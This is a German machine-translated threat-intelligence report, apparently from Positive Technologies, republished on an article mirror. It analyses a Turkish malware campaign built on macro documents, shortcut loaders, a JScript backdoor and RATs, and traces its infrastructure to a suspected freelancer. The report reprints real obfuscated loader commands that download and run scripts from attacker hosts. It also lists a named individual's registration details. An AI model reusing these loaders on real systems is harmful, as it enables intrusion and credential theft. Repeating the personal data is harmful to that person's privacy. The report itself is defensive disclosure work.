<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🌝 😫 🌅 Türkische Tricks mit Würmern, Ratten ... und einem Freiberufler 💅🏾 ▪️ 📠</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Spezialisten der Bedrohungsforschungsgruppe des Positive Technologies Security Centers (PT Expert Security Center) haben eine böswillige Kampagne entd...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Türkische Tricks mit Würmern, Ratten ... und einem Freiberufler</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/479998/">  Spezialisten der Bedrohungsforschungsgruppe des <a href="https://www.ptsecurity.com/ru-ru/research/pt-esc-threat-intelligence/">Positive Technologies Security Centers (PT Expert Security Center) haben</a> eine böswillige Kampagne entdeckt, die mindestens seit Mitte Januar 2018 aktiv ist.  Der Vorgang richtet sich an Benutzer aus Brasilien, Großbritannien, Ungarn, Deutschland, Lettland, den USA, der Türkei und den Philippinen.  Eine Vielzahl von Tools und Techniken wird verwendet, um den PC des Opfers zu infizieren und zu steuern.  In diesem Bericht werden das Infektionsstadium, die verwendeten Dienstprogramme, die Funktionen für die Organisation der Netzwerkinfrastruktur sowie die digitalen Spuren, die uns zum Hacker-Kandidaten gemacht haben, detailliert beschrieben. <br><br><h2>  Zusammenfassung </h2><br><ul><li>  Angreifer haben den Wurm vor 10 Jahren unter Berücksichtigung moderner Techniken verarbeitet </li><li>  Der Zoo von Tools, die in Verbindung mit einer umfangreichen Netzwerkinfrastruktur verwendet werden </li><li>  Der Hauptverdächtige ist ein türkischer Freiberufler </li></ul><a name="habracut"></a><br><h2>  Payload Delivery </h2><br><h3>  Office-Dokumente </h3><br>  Am 5. April 2019 entdeckten Spezialisten des PT Expert Security Center im Rahmen der Verfolgung neuer Bedrohungen ein verdächtiges Bürodokument.  Datei mit der Endung .docm (MS Word-Dokument eines neuen Beispiels mit Makro-Unterstützung): <br><br><ul><li>  einige Tage vor der Entdeckung erstellt (2019-03-31), </li><li>  enthält ein Bild, um den Benutzer zu überzeugen, Makros zu aktivieren, </li><li>  wurde auf einem System in türkischer Sprache erstellt (dies wird durch die Werte der Metadatenfelder belegt: "Konu Başlığı" - "Topic Title", "Konu Ba l, 1" - "Subject Heading, 1"; Google Translate-Übersetzung). </li></ul><br><img src="https://habrastorage.org/webt/vu/vp/fj/vuvpfjfs9iissnmjcse2lyndlmk.png"><br><br>  <i>Abb.</i>  <i>1. Typische Makro-Benachrichtigungsfalle</i> <br><br>  Der Makrocode ist etwas verschleiert, aber lakonisch: Mit dem BITS-Cmdlet (Background Intelligent Transfer Management) für PowerShell wird ein JScript-Skript von einem Angreifer-Server geladen und ausgeführt: <br><br><pre><code class="javascript hljs">Shell (<span class="hljs-string"><span class="hljs-string">"pow"</span></span> &amp; <span class="hljs-string"><span class="hljs-string">"ershe"</span></span> &amp; <span class="hljs-string"><span class="hljs-string">"ll -comm"</span></span> &amp; <span class="hljs-string"><span class="hljs-string">"and "</span></span><span class="hljs-string"><span class="hljs-string">"$h1='e';&amp;('i' + $h1 + 'x')('Import-Module BitsTransfer;Start-BitsTransf' + $h1 + 'r https://definebilimi.com/1/b12.js $env:t' + $h1 + 'mp\bb1.js;');Start-Process -WindowStyle hidden -FilePath 'cmd.exe' -ArgumentList '/c %systemroot%\system32\wscript %temp%\bb1.js'"</span></span><span class="hljs-string"><span class="hljs-string">""</span></span>)</code> </pre> <br>  Die Verwendung von PowerShell und eines atypischen Moduls zum Herunterladen von Dateien von einem Webserver ist darauf zurückzuführen, dass versucht wurde, Einschränkungen beim Starten und Ausführen von nicht vertrauenswürdigen Programmen zu umgehen. <br><br>  Es gibt mehrere ähnliche Dokumente.  Eine davon ist beispielsweise eine DOC-Datei (ein altes MS Word-Dokument) mit einer Codepage mit türkischen Zeichen.  Die Makroarbeit ist auch sehr ähnlich: <br><br><pre> <code class="javascript hljs">Shell <span class="hljs-string"><span class="hljs-string">"cmd.exe /c bitsadmin /transfer myjob /download /priority FOREGROUND https://definebilimi.com/up3e.js %temp%\o2.js &amp; wscript.exe %temp%\o2.js"</span></span>, vbHide</code> </pre> <br>  In diesem Fall verwendet der Autor dieselbe BITS-Technologie, jedoch mit Hilfe des legitimen Systemdienstprogramms bitsadmin.  Interessanterweise senden uns sowohl das Erstellungsdatum des Dokuments als auch der Zeitpunkt seiner Entdeckung in öffentlichen Quellen bis Mitte Juli 2018.  Somit sind Angriffe für mindestens ein Jahr relevant.  Darüber hinaus wird derselbe Angreifer-Server zum Herunterladen der Nutzdaten verwendet.  Der Ansatz zum Benennen eines ladbaren Skripts in JScript ist ähnlich. <br><br>  Ein anderes Dokument hat die Erweiterung .rtf (Rich Text Format).  Es enthält mehrere XLS-Dokumente (altes MS Excel-Dokument) mit demselben Inhalt.  Der Makrocode ist vollständig identisch mit dem aus dem Originaldokument extrahierten, und die Übereinstimmung der Codepage-Werte und des HeadingPairs-XML-Felds führt zu derselben Urheberschaft. <br><br><h3>  LNK-Verknüpfungen </h3><br>  Es ist erwähnenswert, dass in dieser Kampagne nicht nur Office-Dokumente als Anfangsstadium der Infektion verwendet wurden.  Wir haben einige schädliche .lnk-Dateien (Windows Shell Link) gefunden, die beim Start den folgenden Befehl ausführten: <br><br><pre> <code class="javascript hljs">C:\Windows\System32\cmd.exe /c powershell -command <span class="hljs-string"><span class="hljs-string">"$h1='e';&amp;('i' + $h1 + 'x')('Import-Module BitsTransfer;Start-BitsTransf' + $h1 + 'r https://definebilimi.com/1/b12.js $env:t' + $h1 + 'mp\bb.js;')"</span></span> &amp; %systemroot%\system32\wscript %temp%\bb.js</code> </pre> <br>  Die Etiketten wurden Mitte März und Ende April 2019 verteilt. <br><br>  Shortcut-Metadaten enthalten den Benutzernamen win7-bilgisayar (aus dem türkischen „win7-computer“) - den Benutzer des Systems, auf dem sie erstellt wurden. <br><br>  Wir können mit Sicherheit davon ausgehen, dass Phishing-E-Mails das wahrscheinlichste Szenario für die Zustellung schädlicher Dateien im ersten Stadium der Infektion sind. <br><br><h2>  Houdini Metamorphosen </h2><br>  Alle untersuchten Objekte der ersten Infektionsstufe laden dasselbe Skript in JScript herunter und führen es aus (ohne Berücksichtigung geringfügiger Unterschiede).  Die Datei ist nicht verschleiert und nicht gepackt, und die Analyse wurde nur durch zufällige Variablennamen erschwert.  Es ist eine Hintertür auf der WSH-Plattform.  Von den Merkmalen seiner Arbeit kann folgendes unterschieden werden: <br><br><ul><li>  Die Hostadresse und der Port des Management-Servers sind in einem Skript geschützt </li><li>  Die Interaktion mit C &amp; C erfolgt über POST-Requests des HTTP-Protokolls. </li><li>  Zu Beginn der Arbeit wird die Zeichenfolge "is-bekle" in das URI-Feld eingefügt, übersetzt aus dem Türkischen als "is-ready". </li><li>  Das Feld User-Agent enthält kurze Informationen zum System mit dem angegebenen Trennzeichen (in diesem Fall "&lt;|&gt;"): <br><ul><li>  Die Seriennummer der Festplatte </li><li>  Benutzername, </li><li>  Systemversion </li><li>  Skriptname </li><li>  Antivirus-Name </li><li>  Wert der Umgebungsvariablen% ProgramData%, </li><li>  das Vorhandensein von .Net FrameWork 4.5.2 im System, </li><li>  Zeitüberschreitung zwischen Anfragen, </li><li>  Java im System. </li></ul><br></li><li>  <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Kotler-The-Adventures-Of-Av-And-The-Leaky-Sandbox-wp.pdf">Überprüft</a> anhand der angegebenen Seriennummer der Festplatte <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Kotler-The-Adventures-Of-Av-And-The-Leaky-Sandbox-wp.pdf">die</a> Umgebung auf das Thema der Sandbox von Kaspersky Lab.  Im Falle eines Zufalls funktioniert es nicht mehr. </li><li>  Es empfängt vom Server und führt die gegebenen Befehle aus;  Hier sind einige von ihnen: <br><ul><li>  Herunterladen einer Datei vom Server, </li><li>  Datei auf den Server hochladen </li><li>  Sammeln von Inhalten aus der Zwischenablage, </li><li>  Sammlung von Kataloginhalten, </li><li>  Sammlung von Prozessinformationen, </li><li>  Ausführen von Befehlen im Interpreter cmd.exe, </li><li>  Screenshot machen und senden, </li><li>  Abrufen und Senden von Chrome- und Opera-Datenbanken mit Kennwörtern. </li></ul><br></li></ul><br><img src="https://habrastorage.org/webt/ky/xj/ur/kyxjurbcxvvpazharap_hq6fh68.png"><br>  <i>Abb.</i>  <i>2. Der Beginn des in JScript geladenen Skripts vom Angreifer-Server</i> <br><br>  Durch das Vorhandensein von Kommentaren, die Struktur des Codes, die verwendeten Befehlsnamen und das Format zum Sammeln von Informationen über das System kann man eine Parallele zum bekannten VBS-Wurm Houdini ziehen.  Im Jahr 2013 haben unsere Kollegen von FireEye <a href="https://www.fireeye.com/blog/threat-research/2013/09/now-you-see-me-h-worm-by-houdini.html">die</a> Funktionen dieses Trojaners, die Verarbeitung von Befehlen und die Erfassung von Informationen, in denen sie auf ähnliche Weise vorkommen, detailliert <a href="https://www.fireeye.com/blog/threat-research/2013/09/now-you-see-me-h-worm-by-houdini.html">analysiert</a> .  Anscheinend hat der Angreifer in unserem Fall das Modell des bekannten Wurms zugrunde gelegt, Funktionen nicht in VBScript, sondern in JScript umgeschrieben und einige englische Zeilen durch türkische ersetzt. <br><br><img src="https://habrastorage.org/webt/z4/52/2t/z4522tdmc-74q3wrlsz_op7tqki.png"><br><br>  <i>Abb.</i>  <i>3. Verarbeiten von JScript-Backdoor-Befehlen</i> <br><br>  Es ist erwähnenswert, dass als Markierung für die Ergebnisse der Befehlsausführung Zeichenfolgen verwendet werden, die die Teilzeichenfolge „Bcorp“ enthalten.  Es ist auch im Namen des Verwaltungsservers ip1 [.] Bcorp.fun enthalten. <br><br><h3>  Auf einem Angreifer-Server </h3><br>  Laut Shodan hatte ein Angreifer am 30. April 2019 einen auf <a href="https://www.appserv.org/en/">AppServ</a> basierenden Webserver <a href="https://www.appserv.org/en/">gehostet</a> .  Es scheint nicht so, als ob der Server sorgfältig konfiguriert wurde: Beispielsweise ist die Seite phpinfo verfügbar, auf der interessante Konfigurationsinformationen angezeigt werden.  Bei der Analyse der Weblinks, von denen die Malware heruntergeladen wurde, stellte sich heraus, dass der Server über ein offenes Verzeichnis (./a Verzeichnis) verfügte, in dem die Tools anderer Angreifer aufgelistet waren. <br><br><img src="https://habrastorage.org/webt/ti/rg/ms/tirgmslrqtgw3epiumyzv0yrag0.png"><br><br>  <i>Abb.</i>  <i>4. Homepage des Angreifer-Servers</i> <br><br><img src="https://habrastorage.org/webt/cq/-d/g1/cq-dg1v3yxrbqgprtstzphvyogm.png"><br><br>  <i>Abb.</i>  <i>5. Phpinfo-Seite auf dem Angreifer-Server</i> <br><br><img src="https://habrastorage.org/webt/xc/cy/hj/xccyhjiblf6w1xkmzj51prgol-0.png"><br><br>  <i>Abb.</i>  <i>6. Auflistung des offenen Verzeichnisses des Angreifer-Servers Ende April 2019</i> <br><br><img src="https://habrastorage.org/webt/ji/zs/r0/jizsr0d3hrbqout2mrth5hfq794.png"><br><br>  <i>Abb.</i>  <i>7. Auflistung des offenen Verzeichnisses des Angreifer-Servers Ende Mai 2019</i> <br><br>  Unten finden Sie eine Beschreibung der erkannten Dateien. <br><br><h3>  Houdini jscript </h3><br>  Zunächst erhielten wir viele Variationen des oben diskutierten modifizierten Houdini-Wurms.  Das Skript wurde von Version zu Version geringfügig geändert: Hostnamen (husan2.ddns.net, ip1.bcorp.fun, ip1.qqww.eu), Ports (86, 87), Variablennamen, einzelne Befehle erschienen oder verschwanden.  Eine Version wurde sogar als Scriptlet in JScript gerahmt. <br><br><img src="https://habrastorage.org/webt/vp/7v/se/vp7vsedyr71hixfb31ffenjzdg4.png"><br><br>  <i>Abb.</i>  <i>8. Houdini JScript als Scriptlet</i> <br><br><h3>  Bcorp Glas </h3><br>  Selbstgemachte leichte Java-Backdoor.  Es interagiert mit C &amp; C über TCP an Port 22122. Es kann: <br><br><ul><li>  Befehle im Interpreter cmd.exe ausführen, </li><li>  Ermitteln Sie die Version des Systems </li><li>  Verzeichnisse auflisten </li><li>  Dateien hochladen </li><li>  Registrieren Sie sich im Startverzeichnis und im Startzweig der Registrierung. </li></ul><br>  Offenbar sucht der modifizierte Wurm genau deshalb im System nach Java.  Gleichzeitig ist nicht klar, warum eine zusätzliche Hintertür verwendet werden soll, da die ursprüngliche Hintertür über ausreichende Funktionen verfügt. <br><br><h3>  Get-Chromecreds </h3><br>  <a href="https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/credentials/DumpCreds/PS">PowerShell-Wrapper</a> zum Extrahieren von Verlauf, Anmeldungen, Kennwörtern und Cookies aus dem Chrome-Browser.  Einige Versionen enthalten eine Hilfsbibliothek System.Data.SQLite.dll für x86- und x64-Systeme in base64-codierter Form, während andere davon ausgehen, dass sie im Verzeichnis% APPDATA% vorhanden sind.  Die Komponente wird als Zusatz-Plugin für die Haupt-JScript-Backdoor geliefert. <br><br><h3>  Keylogger starten </h3><br>  <a href="">PowerShell-Implementierung eines</a> einfachen Keyloggers.  Die Komponente wird als Zusatz-Plugin für die Haupt-JScript-Backdoor geliefert. <br><br><img src="https://habrastorage.org/webt/lv/z9/hu/lvz9huoub4btquoi2gbiwd8ipsg.png"><br><br>  <i>Abb.</i>  <i>9. PowerShell Keylogger-Code-Snippet</i> <br><br><h3>  WebBrowserPassView </h3><br>  <a href="https://www.nirsoft.net/utils/web_browser_password.html">Ein Dienstprogramm</a> von Nirsoft zum Abrufen von Anmeldungen und Kennwörtern von gängigen Browsern.  Die Angreifer verwendeten die Autorenversion, nachdem sie sie zuvor mit ASPack gepackt hatten, um die Analyse zu erschweren oder die Erkennung durch Indikatoren zu umgehen. <br><br><h3>  NetWire RAT </h3><br>  Ein öffentlich verfügbares, kommerzielles <a href="https://ultrahacks.org/shop/product/netwire-rat/">Tool</a> zur Remote-PC-Steuerung.  Wird von verschiedenen Cyberkriminellengruppen verwendet.  Malware-Entwickler komplizierten die Analyse und Erkennung, indem sie RAT auf der .NET-Plattform in PE packten und den DeepSea 4.1-Codeobfuscator verwendeten. <br><br><h3>  TCP hören </h3><br>  Ein einfaches <a href="https://www.allscoop.com/tcp-listen.php">GUI-Dienstprogramm</a> von AllScoop zum Testen der Parameter eines Routers oder einer Firewall.  Jeder Überwachungsport antwortet mit einer bestimmten Zeichenfolge und beendet die Verbindung. <br><br><img src="https://habrastorage.org/webt/ud/cr/k-/udcrk-bohjearwqg5thpcia9-ym.png"><br><br>  <i>Abb.</i>  <i>10. GUI des TCP Listen Utility</i> <br><br><h3>  LNK-Lader </h3><br>  Shortcut-Loader, ähnlich den bereits früher betrachteten.  Führt beim Start den folgenden Befehl aus: <br><br><pre> <code class="javascript hljs">C:\Windows\System32\cmd.exe /v /c <span class="hljs-string"><span class="hljs-string">"set i=h&amp;&amp;ms!i!ta http://ip1.qqww.eu/1/f.htm"</span></span></code> </pre> <br>  Diesmal wurde die Verknüpfung unter einem anderen Benutzer erstellt (desktop-amkd3n3). <br><br><h3>  Skriptlader </h3><br>  In dieser Gruppe haben wir die verschiedenen Bootloader der oben genannten RAT zusammengefasst.  Alle von ihnen sind klein (bis zu 1 KB), in verschiedenen Formaten (.htm, .xsl, .hta usw.), der Code wird in mehreren Skriptsprachen (JScript, PowerShell) ausgeführt und on-the-fly in C # kompiliert.  Nachfolgend finden Sie Codeausschnitte einiger Beispiele: <br><br><img src="https://habrastorage.org/webt/ga/dk/mj/gadkmjw2x2s7i9br6wvigjbduho.png"><br><br>  <i>Abb.</i>  <i>11. Fragment des .htm-Loaders</i> <br><br><img src="https://habrastorage.org/webt/ta/du/fk/tadufk1tskw_mu33lyhp9o2uieg.png"><br><br>  <i>Abb.</i>  <i>12. Fragment des .xsl-Bootloaders</i> <br><br><img src="https://habrastorage.org/webt/5o/qi/nn/5oqinngzwzjeqgcg_pvv1c7vsgo.png"><br><br>  <i>Abb.</i>  <i>13. Fragment des .ps1-Bootloaders</i> <br><br><h3>  Winzige Pe-Lader </h3><br>  Neben Skriptladern wurden PE-Dateien auf der .NET-Plattform erkannt.  Sie sind auch klein (bis zu 10 KB) und bieten eine ähnlich große Funktionalität: <br><br><img src="https://habrastorage.org/webt/gi/vo/lc/givolcsz3joqwnt0zqtq8ftqzui.png"><br><br>  <i>Abb.</i>  <i>14. Ein Beispiel für den dekompilierten Code eines der PE-Loader</i> <br><br><h3>  xRAT </h3><br>  Ein öffentlich verfügbares, frei verteiltes <a href="https://github.com/c4bbage/xRAT">Projekt</a> für die Remote-PC-Verwaltung.  Verschiedene Versionen und Modifikationen sind weit verbreitet.  Geschrieben in C #, teilweise verschleiert. <br><br><h3>  Bcorp Panel vs.  Baumeister </h3><br>  Der Steuerungsserverteil für die JScript-Backdoor.  Gleichzeitig ist es der Designer des Client-Teils.  Repräsentiert PE auf der .NET-Plattform.  Nicht verschleiert, nicht verpackt.  Die Oberfläche ähnelt einem überarbeiteten Serverteil für den bereits erwähnten VBS-Wurm Houdini.  Zusätzlich zum Senden von Befehlen werden zusätzliche Komponenten und Plugins auf den infizierten Computer heruntergeladen: Java-Umgebung, PowerShell-Skripte und ein Dienstprogramm von Nirsoft zum Sammeln von Informationen von Browsern, PowerShell-Skripte zum Abfangen von Tastenanschlägen usw. Es ist merkwürdig, dass das Projekt BcorpRat heißt , was im Fenstertitel in den Bildern unten zu sehen ist.  Und im Namen des Namensraums des Quellcodes steht die Zeile „Btech“, auf die wir später zurückkommen werden. <br><br><img src="https://habrastorage.org/webt/m3/ix/63/m3ix63sjf1-fe3rawasy_jmhldk.png"><br><br>  <i>Abb.</i>  <i>15. JScript Backdoor Control Panel, Hauptfenster</i> <br><br><img src="https://habrastorage.org/webt/ob/qq/8g/obqq8gb4arhzlfjowoxato5v3yu.png"><br><br>  <i>Abb.</i>  <i>16. Das Control Panel JScript-Backdoor, das Designer-Fenster des Client-Teils</i> <br><br><h2>  Netzwerkinfrastruktur </h2><br>  Als nächstes werden wir eine detailliertere Analyse der Adressen durchführen, mit denen diese oder andere Schadprogramme des Angreifers interagieren.  Beginnen wir mit der Domain definebilimi.com, auf die über Office-Dokumente und Shortcut-Loader zugegriffen werden kann. <br><br><h3>  definebilimi.com </h3><br>  Am 16. Januar 2018 hat diese Domain einen neuen Eigentümer.  Übrigens, "define bilimi" wird wörtlich aus dem Türkischen übersetzt als "Schatz der Wissenschaft".  Im Folgenden sind die interessantesten Daten aus der Geschichte der WHOIS-Datensätze zu diesem Zeitpunkt aufgeführt. <br>  Tabelle 1. Informationen zum Registranten (Eigentümer) der Domain definebilimi.com <br><br><div class="scrollable-table"><table><tbody><tr><th>  Datensatzname </th><th>  Wert aufzeichnen </th></tr><tr><td>  Registrantenname </td><td>  Koray Yaman </td></tr><tr><td>  Registrant Straße </td><td>  123456 </td></tr><tr><td>  Registrant Stadt </td><td>  Istanbul </td></tr><tr><td>  Registrierungsland </td><td>  TR </td></tr><tr><td>  Registrant-Telefon </td><td>  +90.5350167352 </td></tr><tr><td>  Registrant Email </td><td>  btech@hotmail.com.tr </td></tr></tbody></table></div><br>  Es wird rücksichtslos sein zu behaupten, dass die Daten echt sind.  Das angegebene Land und die Häufigkeit des Auftretens von Spuren der türkischen Sprache im Kodex lassen vermuten, dass diese Zufälle nicht zufällig sind.  Und die E-Mail-Adresse enthält die Teilzeichenfolge "btech", auf die wir bereits geachtet haben. <br><br>  Der Verlauf der Änderungen an NS-Servern, die Informationen zur registrierten Domain bereitgestellt haben, sieht interessant aus: <br><br><div class="scrollable-table"><table><tbody><tr><th>  Datum </th><th>  Aktion </th><th>  Server </th></tr><tr><td>  17.03.2008 </td><td>  Neuer Eintrag </td><td>  buhar.biz </td></tr><tr><td>  15.01.2013 </td><td>  Änderung aufzeichnen </td><td>  definebilimi.com </td></tr><tr><td>  06/04/2019 </td><td>  Änderung aufzeichnen </td><td>  qqww.eu </td></tr></tbody></table></div><br>  <i>Tabelle 2. Verlauf der NS-Server für die Domain definebilimi.com</i> <br><br>  Die Hosts buhar.biz und qqww.eu wurden bereits früher in Malware gefunden. <br><br><h3>  buhar.us </h3><br>  Die neue Geschichte dieser Domain ("buhar" von Türkisch - "Paare") beginnt am selben Tag wie die Geschichte von definebilimi.com - 16. Januar 2018. <br><br><div class="scrollable-table"><table><tbody><tr><th>  Datensatzname </th><th>  Wert aufzeichnen </th></tr><tr><td>  Registrantenname </td><td>  Balta Zar </td></tr><tr><td>  Registrantenorganisation </td><td>  Buharus </td></tr><tr><td>  Registrant Straße </td><td>  Gizli </td></tr><tr><td>  Registrant Stadt </td><td>  Gizli </td></tr><tr><td>  Registrierungsland </td><td>  TR </td></tr><tr><td>  Registrant-Telefon </td><td>  +1.123456789 </td></tr><tr><td>  Registrant Email </td><td>  buharcin@yandex.com </td></tr></tbody></table></div><br>  <i>Tabelle 3. Informationen zum Registranten (Eigentümer) der Domain buhar.us</i> <br><br>  Die Situation ist ähnlich: Auch hier sehen einige Daten bis auf die Postanschrift („buharcin“ aus der türkischen Sprache - „locomotive“) falsch aus. <br><br><h3>  bcorp.fun </h3><br>  Die Domain ist seit dem 23. März 2019 registriert.  Neben der Tatsache, dass die Türkei erneut als Land registriert ist, ist Bcorp als Kundenorganisation aufgeführt.  Tatsächlich sehen wir dasselbe im Domainnamen selbst, wie in mehreren Absätzen zuvor. <br><br><h3>  husan2.ddns.net </h3><br>  Es ist merkwürdig, dass der Angreifer Gastgeber nicht nur auf klassische Weise erwirbt.  Seit Mitte März 2019 wird die Nutzung von sogenannten dynamischen DNS-Servern aufgezeichnet.  Mithilfe dieser Technologie können Angreifer ihre IP-Adressen effektiv verbergen und die Vitalität ihrer Kontrollzentren sicherstellen.  Es ist erwähnenswert, dass die Auswahl der Namen vorhersehbar ist: Nach einigen Monaten wurde beispielsweise die Verwendung der Domäne husan3.ddns.net entdeckt, die Aktivität der Domäne husan.ddns.net reicht jedoch bis April 2017 zurück. <br><br><h3>  bkorp.xyz </h3><br>  Seit Anfang April registriert der Hacker, der weiterhin auf dem Weg der Anonymisierung ist, Domains über den Dienst WhoisGuard, Inc. in Panama.  bkorp.xyz, prntsrcn.com und i37-imgur.com sind nur einige Beispiele.  Die verwendeten NS-Server verknüpfen sie weiterhin mit anderen böswilligen Domänen. <br><br><h3>  qqww.eu </h3><br>  Zusätzlich zu der Tatsache, dass diese Domain wie die Domain bcorp.fun eine Subdomain ip1 hat, gibt es ein weiteres wichtiges Detail.  Die Angaben zum Registranten geben die Organisation Osbil Technology Ltd. an, die sich angeblich in Berlin befindet.  Tatsächlich befindet sich die gleichnamige Organisation an der Küste Zyperns in der Stadt Famagusta - auf dem Gebiet der teilweise anerkannten türkischen Republik Nordzypern.  Und die offizielle <a href="https://www.yoncu.com/">Website des</a> Unternehmens befindet sich auf der Domain, die von März bis Mai 2019 der NS-Server der Domain bcorp.fun war.  Es wurden keine Anzeichen für eine Gefährdung des Nameservers festgestellt, und die Infrastrukturfunktionen des NS-Anbieters (Ersetzen des Clients durch die Anbieterdaten in der Registrantenspalte) ermöglichten es, Clientinformationen vor dem öffentlichen Zugriff zu verbergen. <br><br><img src="https://habrastorage.org/webt/7s/zz/q2/7szzq2mjgkuppmdvnpd_xdrk41c.png"><br><br>  <i>Abb.</i>  <i>17. Informationen zum Registranten (Eigentümer) der Domain qqww.eu</i> <br><br><h3>  IP-Adressen </h3><br>  Der Vollständigkeit halber sind im Folgenden die IP-Adressen aufgeführt, denen einige Domänen in unterschiedlichen Zeitintervallen entsprechen: <br><ul><li>  5.255.63.12 <br><ul><li>  bcorp.fun </li><li>  husan.ddns.net </li><li>  husan2.ddns.net </li><li>  husan3.ddns.net </li><li>  qqww.eu </li></ul><br></li><li>  192.95.3.137 <br><ul><li>  bcorp.fun </li><li>  bkorp.xyz </li><li>  definebilimi.com </li><li>  i36-imgur.com </li><li>  i37-imgur.com </li><li>  i38-imgur.com </li><li>  i39-imgur.com </li><li>  prntsrcn.com </li><li>  qqww.eu </li></ul><br></li><li>  192.95.3.140 <br><ul><li>  bkorp.xyz </li><li>  buhar.us </li></ul><br><h2>  Im Gefolge des Hackers </h2><br>  Unter den böswilligen und Hilfswerkzeugen wurde auf dem Server des Angreifers ein merkwürdiges Bild gefunden: <br><br><img src="https://habrastorage.org/webt/c9/pi/gf/c9pigfzw8s36wno_idj18gwv57u.png"><br><br>  <i>Abb.</i>  <i>18. Das Bild im Verzeichnis auf dem Host des Angreifers</i> <br><br>  Wir haben die Auflösung des Bildes nicht reduziert, sondern hier in der Form platziert, in der es auf dem Host war. <br><br>  Trotz der geringen Bildqualität konnten wir feststellen, dass dies ein Screenshot einer Seite über eine abgeschlossene Transaktion mit Kryptowährung auf der Ressource blockr.io ist.  Das hat nicht funktioniert, also haben wir versucht, alles zu finden, was mit dem Namen IMG_JPEG-0371e4dce3c8804f1543c3f0f309cc11.jpg zusammenhängt, mit dem das Bild vom Hacker gespeichert wurde.  Die Spuren führten dazu, dass auf einem Online-Analysator eine Datei verarbeitet wurde, deren Name mit dem Namen unseres Bildes übereinstimmte.  Das verarbeitete Objekt ist eine Windows-Verknüpfung, ähnlich der, die wir bereits zuvor untersucht haben.  Ihm wurde ein Bild mit einem Foto des Personalausweises eines türkischen Staatsbürgers beigefügt, dessen Nachname mit dem Nachnamen übereinstimmt, der bei der Registrierung der Domain angegeben wurde - Yaman. <br><br><img src="https://habrastorage.org/webt/pr/b7/ca/prb7cacgvurge0qqdt3tqnbthxe.png"><br><br>  <i>Abb.</i>  <i>19. Ausweis mit Bootloader</i> <br><br>  Die Verarbeitung der Verknüpfung in der Online-Sandbox erfolgte nicht, weil der Benutzer die Datei heruntergeladen hatte, sondern indem er die URL übermittelte, von der das Objekt heruntergeladen und verarbeitet werden musste: <br><br> <code>hxxps://github.com/btechim/prntsrcn/blob/nm46ny/IMG-0371e4dce3c8804f1543c3f0f309cc11.jpg.lnk?raw=true</code> <br> <br>  Das Github-Konto des Benutzers ist jedoch bereits gesperrt. Über den Link können Sie den Benutzernamen (btechim) und den Projektnamen (prntsrcn) festlegen.  Der Projektname stimmt mit dem Namen einer der in der Kampagne gefundenen Domänen überein (prntsrcn.com), und der Spitzname des Benutzers enthält die Teilzeichenfolge btech, die im Programmcode der oben genannten Admin-Bereiche angezeigt wird. <br><br>  Die Suche nach dem Spitznamen eines Benutzers führte uns zu einer Ressource für Freiberufler, auf der sich eine Benutzerseite aus der Türkei befindet - mit demselben Spitznamen, einer bestätigten Telefonnummer, einer Postanschrift und einem Facebook-Profil -, die ihre Dienste bei der Entwicklung von Software im Bereich Cybersicherheit anbietet. <br><br><img src="https://habrastorage.org/webt/cf/f2/y0/cff2y0moihsk3fy6abo_wu2489c.png"><br><br>  <i>Abb.</i>  <i>20. Die angebliche Angreiferseite auf der Ressource für Freiberufler</i> <br><br><h2>  Schlussfolgerungen </h2><br>  Die Experten von Positive Technologies überwachten mehrere Monate lang die Entwicklung einer böswilligen Kampagne türkischen Ursprungs und übermittelten die gesammelten Daten an CERT Turkey.  Es kommt nicht oft vor, dass bei einer Serie von Angriffen der Einsatz moderner Techniken und recycelter Werkzeuge vor 10 Jahren kombiniert wird.  Der Angreifer verwendete verschiedene Tools (je nach Zweck, Plattform und Schwierigkeitsgrad), um die vollständige Kontrolle über den Ziel-PC zu erlangen.  Es ist erwähnenswert, wie unterschiedlich die Ansätze bei der Vorbereitung der Netzwerkinfrastruktur sind, um ihre Identität zu verbergen.  Es wurde jedoch noch einmal nicht alles berücksichtigt, Arroganz und mehrere Unterlassungen wurden vom Täter ausgegeben.  Die Studie wurde an das türkische Information Security Incident Response Center weitergeleitet. <br><br><div class="spoiler">  <b class="spoiler_title">IOCs</b> <div class="spoiler_text">  Bürolader: <br>  3305720da73efbcb7d25edbb7eff5a1a <br>  5b6d77f3e48e7723498ede5d5ba54f26 <br>  621a0133e28edec77a2d3e75115b8655 <br>  712e7ec49ad3b8c91b326b6d5ee8dcd8 <br>  731a3d72e3d36c2270c1d0711c73c301 <br>  929374b35a73c59fe97b336d0c414389 <br><br>  LNK-Lader: <br>  3bc5d95e2bd2d52a300da9f3036f5b3b <br>  527069e966b4a854df35aef63f45986a <br>  